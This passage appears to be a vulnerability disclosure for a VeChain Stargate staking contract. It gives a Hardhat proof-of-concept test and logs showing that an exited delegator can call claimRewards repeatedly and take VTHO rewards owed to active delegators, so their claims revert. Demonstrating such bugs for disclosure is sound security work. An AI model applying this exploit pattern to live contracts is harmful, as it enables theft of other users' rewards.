  nodeUrl: "http://localhost:8669",
  network: {
    id: "solo",
    name: "solo",
    type: "solo",
    defaultNet: true,
    urls: [
      "http://localhost:8669"
    ],
    explorerUrl: "https://explore-testnet.vechain.org",
    blockTime: 10000,
    genesis: {
      id: "0x0000000089970f535c92d8f2151346f002755b4cf6f7fb4b731317fc6df8ee51"
    }
  },
  cyclePeriods: [
    { value: 18, label: "3 minutes" },
    { value: 180, label: "30 minutes" },
    { value: 8640, label: "1 day" },
  ],
}
export default config;
```

Create a new file you can call it `DelegationExitRewardsClaimBug.test.ts` and add this to it

run this command to run the test `VITE_APP_ENV=local npx hardhat test test/integration/DelegationExitRewardsClaimBug.test.ts`

```ts

import { expect } from "chai";
import { ethers } from "hardhat";
import {
    MyERC20,
    MyERC20__factory,
    ProtocolStakerMock,
    ProtocolStakerMock__factory,
    Stargate,
    StargateNFTMock,
    StargateNFTMock__factory,
    TokenAuctionMock,
    TokenAuctionMock__factory,
} from "../../typechain-types";
import { getOrDeployContracts } from "../../test/helpers/deploy";
import { createLocalConfig } from "@repo/config/contracts/envs/local";
import { ethers as hardhatEthers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { TransactionResponse } from "ethers";

describe("Delegation Exit Rewards Claim Bug POC", () => {
    const VTHO_TOKEN_ADDRESS = "0x0000000000000000000000000000456E65726779";
    let stargateContract: Stargate;
    let stargateNFTMock: StargateNFTMock;
    let protocolStakerMock: ProtocolStakerMock;
    let legacyNodesMock: TokenAuctionMock;
    let deployer: HardhatEthersSigner;
    let delegator1: HardhatEthersSigner;
    let delegator2: HardhatEthersSigner;
    let validator: HardhatEthersSigner;
    let tx: TransactionResponse;
    let vthoTokenContract: MyERC20;

    const LEVEL_ID = 1;

    const VALIDATOR_STATUS_UNKNOWN = 0;
    const VALIDATOR_STATUS_QUEUED = 1;
    const VALIDATOR_STATUS_ACTIVE = 2;
    const VALIDATOR_STATUS_EXITED = 3;

    const DELEGATION_STATUS_NONE = 0;
    const DELEGATION_STATUS_PENDING = 1;
    const DELEGATION_STATUS_ACTIVE = 2;
    const DELEGATION_STATUS_EXITED = 3;

    beforeEach(async () => {
        const config = createLocalConfig();
        [deployer] = await hardhatEthers.getSigners();

        // Deploy protocol staker mock
        const protocolStakerMockFactory = new ProtocolStakerMock__factory(deployer);
        protocolStakerMock = await protocolStakerMockFactory.deploy();
        await protocolStakerMock.waitForDeployment();

        // Deploy stargateNFT mock
        const stargateNFTMockFactory = new StargateNFTMock__factory(deployer);
        stargateNFTMock = await stargateNFTMockFactory.deploy();
        await stargateNFTMock.waitForDeployment();

        // Deploy VTHO token to the energy address
        const vthoTokenContractFactory = new MyERC20__factory(deployer);
        const tokenContract = await vthoTokenContractFactory.deploy(
            deployer.address,
            deployer.address
        );
        await tokenContract.waitForDeployment();
        const tokenContractBytecode = await ethers.provider.getCode(tokenContract);
        await ethers.provider.send("hardhat_setCode", [VTHO_TOKEN_ADDRESS, tokenContractBytecode]);

        // Deploy legacy nodes mock
        const legacyNodesMockFactory = new TokenAuctionMock__factory(deployer);
        legacyNodesMock = await legacyNodesMockFactory.deploy();
        await legacyNodesMock.waitForDeployment();

        // Deploy contracts
        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerMock.getAddress();
        config.STARGATE_NFT_CONTRACT_ADDRESS = await stargateNFTMock.getAddress();
        const contracts = await getOrDeployContracts({ forceDeploy: true, config });
        stargateContract = contracts.stargateContract;
        vthoTokenContract = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, deployer);
        delegator1 = contracts.otherAccounts[0];
        delegator2 = contracts.otherAccounts[1];
        validator = contracts.otherAccounts[2];

        // add validator
        tx = await protocolStakerMock.addValidation(validator.address, 120);
        await tx.wait();

        // set the stargate contract address so it can be used for withdrawals and rewards
        tx = await protocolStakerMock.helper__setStargate(stargateContract.target);
        await tx.wait();
        // set the validator status to active so it can be delegated to
        tx = await protocolStakerMock.helper__setValidatorStatus(
            validator.address,
            VALIDATOR_STATUS_ACTIVE
        );
        await tx.wait();

        // set the mock values in the stargateNFTMock contract
        // set get level response
        tx = await stargateNFTMock.helper__setLevel({
            id: LEVEL_ID,
            name: "Strength",
            isX: false,
            maturityBlocks: 10,
            scaledRewardFactor: 150,
            vetAmountRequiredToStake: ethers.parseEther("1"),
        });
        await tx.wait();

        // set get token response
        tx = await stargateNFTMock.helper__setToken({
            tokenId: 10000,
            levelId: LEVEL_ID,
            mintedAtBlock: 0,
            vetAmountStaked: ethers.parseEther("1"),
            lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
        });
        await tx.wait();

        // set the legacy nodes mock
        tx = await stargateNFTMock.helper__setLegacyNodes(legacyNodesMock);
        await tx.wait();

        // mint just enough VTHO to the stargate contract for the rewards to be distributed
        const rewardsNeeded = ethers.parseEther("0.4"); // 400 VTHO total (200 + 200)
        tx = await vthoTokenContract
            .connect(deployer)
            .mint(stargateContract.target, rewardsNeeded);
        await tx.wait();

        // Fund the delegators with VET for staking
        await ethers.provider.send("hardhat_setBalance", [delegator1.address, "0x" + (10 ** 18).toString(16)]); // 1 VET
        await ethers.provider.send("hardhat_setBalance", [delegator2.address, "0x" + (10 ** 18).toString(16)]); // 1 VET
        await ethers.provider.send("hardhat_setBalance", [stargateContract.target, "0x" + (10 ** 20).toString(16)]); // 100 VET
    });

    it("POC: Exited delegator can keep claiming rewards for active delegation periods", async () => {
        const validatorAddress = validator.address;

        // Mint tokens for delegators
        tx = await stargateNFTMock.mint(LEVEL_ID, delegator1.address);
        await tx.wait();
        const tokenId1 = await stargateNFTMock.getCurrentTokenId();

        tx = await stargateNFTMock.mint(LEVEL_ID, delegator2.address);
        await tx.wait();
        const tokenId2 = await stargateNFTMock.getCurrentTokenId();

        // delegator1 delegates to validator (starts in period 1)
        console.log("\n=== Step 1: delegator1 delegates to validator ===");
        tx = await stargateContract.connect(delegator1).delegate(tokenId1, validatorAddress);
        await tx.wait();
        // get delegationstatus1
        let delegationStatus1 = await stargateContract.getDelegationStatus(tokenId1);

        // delegator2 delegates to the same validator (starts in period 1)
        tx = await stargateContract.connect(delegator2).delegate(tokenId2, validatorAddress);
        await tx.wait();
        let delegationStatus2 = await stargateContract.getDelegationStatus(tokenId2);

        // Log effective stake after delegations (period 1 delegations)
        const [, , , currentPeriods1] = await protocolStakerMock.getValidationPeriodDetails(validatorAddress);
        const effectiveStake1 = await stargateContract.getDelegatorsEffectiveStake(validatorAddress, currentPeriods1 + 2n);
        console.log(`Validator effective stake after both delegations: ${String(effectiveStake1)} (period ${currentPeriods1 + 2n})`);

        // Fast-forward to period 2: delegations become active
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validatorAddress, 2);
        await tx.wait();

        //Both delegations are now ACTIVE in period 2
        delegationStatus1 = await stargateContract.getDelegationStatus(tokenId1);
        delegationStatus2 = await stargateContract.getDelegationStatus(tokenId2);
        expect(delegationStatus1).to.equal(DELEGATION_STATUS_ACTIVE);
        expect(delegationStatus2).to.equal(DELEGATION_STATUS_ACTIVE);

        // delegator1 requests delegation exit (in period 3, validator remains ACTIVE)
        tx = await stargateContract.connect(delegator1).requestDelegationExit(tokenId1);
        await tx.wait();

        // Verify delegation is still active but has requested exit
        const hasRequestedExit1 = await stargateContract.hasRequestedExit(tokenId1);
        delegationStatus1 = await stargateContract.getDelegationStatus(tokenId1);
        expect(hasRequestedExit1).to.be.true;
        expect(delegationStatus1).to.equal(DELEGATION_STATUS_ACTIVE); // Still ACTIVE

        // Verify validator is still ACTIVE
        const [, , , , validatorStatus] = await protocolStakerMock.getValidation(validatorAddress);
        expect(validatorStatus).to.equal(VALIDATOR_STATUS_ACTIVE);

        // Log effective stake after exit request (period 3 setup)
        const [, , , currentPeriods3] = await protocolStakerMock.getValidationPeriodDetails(validatorAddress);
        const effectiveStakeAfterExit = await stargateContract.getDelegatorsEffectiveStake(validatorAddress, currentPeriods3 + 2n);
        console.log(`Validator effective stake after delegator1 exit request: ${String(effectiveStakeAfterExit)} (period ${currentPeriods3 + 2n})`);

        // Advance to period 6
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validatorAddress, 6);
        await tx.wait();

        // Check delegator1 status (should be EXITED now)
        delegationStatus1 = await stargateContract.getDelegationStatus(tokenId1);
        expect(delegationStatus1).to.equal(DELEGATION_STATUS_EXITED);

        // Check delegator2 status (still ACTIVE) and is the one that should claim rewards
        delegationStatus2 = await stargateContract.getDelegationStatus(tokenId2);
        expect(delegationStatus2).to.equal(DELEGATION_STATUS_ACTIVE);

        // Test reward claiming: delegator1 should be able to claim rewards for periods 2-3 (when they were active) nothing more
        // but not period 4+ (when they were exited)

        // Check claimable delegation periods for delegator1
        const [firstClaimable, lastClaimable] = await stargateContract.claimableDelegationPeriods(tokenId1);
        console.log(`delegator1 claimable periods: ${firstClaimable} to ${lastClaimable}`);//this is reflected as first time cliamable is called endperiod > nextClaimablePeriod so its capped at endperiod

        // Get VTHO balance before claiming
        const vthoBalanceBefore = await vthoTokenContract.balanceOf(delegator1.address);
        console.log(`delegator1 VTHO balance before claim: ${String(vthoBalanceBefore)}`);

        // Claim rewards for delegator1
        tx = await stargateContract.connect(delegator1).claimRewards(tokenId1);
        await tx.wait();

        // Get VTHO balance after claiming
        const vthoBalanceAfter = await vthoTokenContract.balanceOf(delegator1.address);
        const rewardsClaimed = vthoBalanceAfter - vthoBalanceBefore;
        console.log(`delegator1 VTHO balance after claim: ${String(vthoBalanceAfter)}`);
        console.log(`delegator1 rewards claimed: ${String(rewardsClaimed)}`);
        tx = await stargateContract.connect(delegator1).claimRewards(tokenId1);//claiming twice or mutliple times make exited delegator steal rewards that is supposed to be for active delegators
        await tx.wait();

        const vthoBalanceAfter2 = await vthoTokenContract.balanceOf(delegator1.address);
        const rewardsClaimed2 = vthoBalanceAfter2 - vthoBalanceAfter;
        console.log(`delegator1 VTHO balance after claim for periods he wsn't active in: ${String(vthoBalanceAfter2)}`);
        console.log(`delegator1 rewards claimed(stolen): ${String(rewardsClaimed2)}`);
        

        // Now check delegator2's claimable rewards - they should have claimable rewards
        const delegator2BalanceBeforeCheck = await vthoTokenContract.balanceOf(delegator2.address);
        console.log(`delegator2 VTHO balance before claim check: ${String(delegator2BalanceBeforeCheck)}`);

        const [delegator2FirstClaimable, delegator2LastClaimable] = await stargateContract.claimableDelegationPeriods(tokenId2);
        console.log(`delegator2 claimable periods: ${delegator2FirstClaimable} to ${delegator2LastClaimable}`);

        // Check that delegator2 has claimable rewards
        const delegator2ClaimableAmount = await stargateContract.claimableRewards(tokenId2);
        console.log(`delegator2 claimableRewards amount: ${String(delegator2ClaimableAmount)}`);

        // expect claimRewards to revert due to insufficient balance (stolen by exited delegator)
        try {
            await stargateContract.connect(delegator2).claimRewards(tokenId2);
        } catch (error: any) {
            console.log(`delegator2 claim reverted with error: ${error.message}`);
        }

    });
});
```


Logs:

```sh

  Delegation Exit Rewards Claim Bug POC

=== Step 1: delegator1 delegates to validator ===
Validator effective stake after both delegations: 3000000000000000000 (period 2)
Validator effective stake after delegator1 exit request: 1500000000000000000 (period 4)
delegator1 claimable periods: 2 to 3
delegator1 VTHO balance before claim: 0
delegator1 VTHO balance after claim: 100000000000000000
delegator1 rewards claimed: 100000000000000000
delegator1 VTHO balance after claim for periods he wsn't active in: 400000000000000000
delegator1 rewards claimed(stolen): 300000000000000000
delegator2 VTHO balance before claim check: 0
delegator2 claimable periods: 2 to 6
delegator2 claimableRewards amount: 400000000000000000
delegator2 claim reverted with error: VM Exception while processing transaction: reverted with custom error 'ERC20InsufficientBalance("0x59b670e9fA9D0A427751Af201D676719a970857b", 0, 400000000000000000)'
    ✔ POC: Exited delegator can keep claiming rewards for active delegation periods (158ms)


```